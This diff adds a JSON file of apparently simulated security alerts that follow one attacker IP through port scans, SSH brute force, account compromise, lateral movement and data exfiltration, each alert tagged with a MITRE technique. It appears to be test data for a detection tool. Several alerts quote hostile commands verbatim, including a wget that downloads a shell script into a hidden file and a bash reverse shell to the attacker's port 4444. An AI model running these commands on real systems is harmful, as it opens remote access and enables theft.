@@ -1,0 +1,292 @@
+[
+  {
+    "id": "ALERT-0001",
+    "timestamp": "2026-04-17T15:03:55.875551",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "WEB SERVICE SCAN detected: 10 unique ports on 10.0.0.5 in 30s | Total ports: 10",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0002",
+    "timestamp": "2026-04-17T15:03:55.926423",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "WEB SERVICE SCAN detected: 11 unique ports on 10.0.0.5 in 30s | Total ports: 11",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0003",
+    "timestamp": "2026-04-17T15:03:55.978098",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "WEB SERVICE SCAN detected: 12 unique ports on 10.0.0.5 in 30s | Total ports: 12",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0004",
+    "timestamp": "2026-04-17T15:03:56.029752",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "WEB SERVICE SCAN detected: 13 unique ports on 10.0.0.6 in 30s | Total ports: 13",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0005",
+    "timestamp": "2026-04-17T15:03:56.081441",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "DATABASE ENUMERATION SCAN detected: 14 unique ports on 10.0.0.6 in 30s | Total ports: 14",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0006",
+    "timestamp": "2026-04-17T15:03:56.133380",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "DATABASE ENUMERATION SCAN detected: 15 unique ports on 10.0.0.6 in 30s | Total ports: 15",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0007",
+    "timestamp": "2026-04-17T15:03:56.185181",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "DATABASE ENUMERATION SCAN detected: 16 unique ports on 10.0.0.6 in 30s | Total ports: 16",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0008",
+    "timestamp": "2026-04-17T15:03:56.237029",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "DATABASE ENUMERATION SCAN detected: 17 unique ports on 10.0.0.6 in 30s | Total ports: 17",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0009",
+    "timestamp": "2026-04-17T15:03:56.288843",
+    "ip": "45.33.32.156",
+    "type": "PORT_SCAN_DETECTED",
+    "message": "DATABASE ENUMERATION SCAN detected: 18 unique ports on 10.0.0.6 in 30s | Total ports: 18",
+    "severity": "HIGH",
+    "mitre_technique": "T1046",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0010",
+    "timestamp": "2026-04-17T15:03:57.242676",
+    "ip": "45.33.32.156",
+    "type": "BRUTE_FORCE_DETECTED",
+    "message": "5 failed SSH logins for user 'ubuntu' in 60s",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0011",
+    "timestamp": "2026-04-17T15:03:57.344523",
+    "ip": "45.33.32.156",
+    "type": "BRUTE_FORCE_DETECTED",
+    "message": "6 failed SSH logins for user 'kali' in 60s",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0012",
+    "timestamp": "2026-04-17T15:03:57.446335",
+    "ip": "45.33.32.156",
+    "type": "BRUTE_FORCE_DETECTED",
+    "message": "7 failed SSH logins for user 'pi' in 60s",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0013",
+    "timestamp": "2026-04-17T15:03:57.548197",
+    "ip": "45.33.32.156",
+    "type": "BRUTE_FORCE_DETECTED",
+    "message": "8 failed SSH logins for user 'user' in 60s",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0014",
+    "timestamp": "2026-04-17T15:03:57.950254",
+    "ip": "45.33.32.156",
+    "type": "CREDENTIAL_STUFFING_SUCCESS",
+    "message": "Successful SSH login as 'ubuntu' after 8 failures \u2014 ACCOUNT COMPROMISED",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1110.004",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0015",
+    "timestamp": "2026-04-17T15:03:58.454696",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `whoami`",
+    "severity": "HIGH",
+    "mitre_technique": "T1059",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0016",
+    "timestamp": "2026-04-17T15:03:58.606878",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `id`",
+    "severity": "HIGH",
+    "mitre_technique": "T1059",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0017",
+    "timestamp": "2026-04-17T15:03:58.759281",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `uname -a`",
+    "severity": "HIGH",
+    "mitre_technique": "T1059",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0018",
+    "timestamp": "2026-04-17T15:03:58.911492",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `cat /etc/passwd`",
+    "severity": "HIGH",
+    "mitre_technique": "T1059",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0019",
+    "timestamp": "2026-04-17T15:03:59.064503",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `sudo -l`",
+    "severity": "HIGH",
+    "mitre_technique": "T1548.003",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0020",
+    "timestamp": "2026-04-17T15:03:59.216605",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `find / -perm -4000 2>/dev/null`",
+    "severity": "HIGH",
+    "mitre_technique": "T1059",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0021",
+    "timestamp": "2026-04-17T15:03:59.367921",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `wget http://45.33.32.156/shell.sh -O /tmp/.hidden`",
+    "severity": "HIGH",
+    "mitre_technique": "T1105",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0022",
+    "timestamp": "2026-04-17T15:03:59.519318",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `chmod 777 /tmp/.hidden`",
+    "severity": "HIGH",
+    "mitre_technique": "T1059",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0023",
+    "timestamp": "2026-04-17T15:03:59.670584",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'ubuntu' on web01 ran: `bash -i >& /dev/tcp/45.33.32.156/4444 0>&1`",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1059.004",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0024",
+    "timestamp": "2026-04-17T15:04:00.623882",
+    "ip": "45.33.32.156",
+    "type": "SUSPICIOUS_COMMAND_EXECUTED",
+    "message": "User 'root' on web01 ran: `crontab -e`",
+    "severity": "HIGH",
+    "mitre_technique": "T1053.003",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0025",
+    "timestamp": "2026-04-17T15:04:01.275889",
+    "ip": "45.33.32.156",
+    "type": "LATERAL_MOVEMENT_DETECTED",
+    "message": "SSH lateral movement: web01 \u2192 db01 as 'root'",
+    "severity": "HIGH",
+    "mitre_technique": "T1021.004",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0026",
+    "timestamp": "2026-04-17T15:04:01.577202",
+    "ip": "45.33.32.156",
+    "type": "LATERAL_MOVEMENT_DETECTED",
+    "message": "SMB lateral movement: db01 \u2192 fileserver as 'administrator'",
+    "severity": "HIGH",
+    "mitre_technique": "T1021.002",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0027",
+    "timestamp": "2026-04-17T15:04:01.878700",
+    "ip": "45.33.32.156",
+    "type": "LATERAL_MOVEMENT_DETECTED",
+    "message": "RDP lateral movement: fileserver \u2192 backup-server as 'backup-admin'",
+    "severity": "HIGH",
+    "mitre_technique": "T1021.001",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0028",
+    "timestamp": "2026-04-17T15:04:02.931851",
+    "ip": "45.33.32.156",
+    "type": "DATA_EXFILTRATION_DETECTED",
+    "message": "Large data transfer: 150.00 MB from db01 to 45.33.32.156 via HTTPS",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1041",
+    "session": "c98fe84a"
+  },
+  {
+    "id": "ALERT-0029",
+    "timestamp": "2026-04-17T15:04:03.233294",
+    "ip": "45.33.32.156",
+    "type": "DATA_EXFILTRATION_DETECTED",
+    "message": "Large data transfer: 500.00 MB from fileserver to 45.33.32.156 via FTP",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1041",
+    "session": "c98fe84a"
+  }
+]
